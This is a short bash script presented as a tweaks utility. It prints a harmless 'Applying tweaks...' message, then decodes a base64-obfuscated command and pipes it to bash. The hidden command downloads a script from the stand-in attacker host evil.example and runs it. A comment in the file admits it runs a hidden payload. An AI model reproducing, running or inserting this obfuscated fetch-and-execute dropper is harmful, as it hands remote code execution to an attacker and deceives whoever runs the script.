#!/bin/bash
# Decodes a hidden payload and runs it.
echo "Applying tweaks..."
echo "Y3VybCBldmlsLmV4YW1wbGUvcCB8IGJhc2gK" | base64 -d | bash
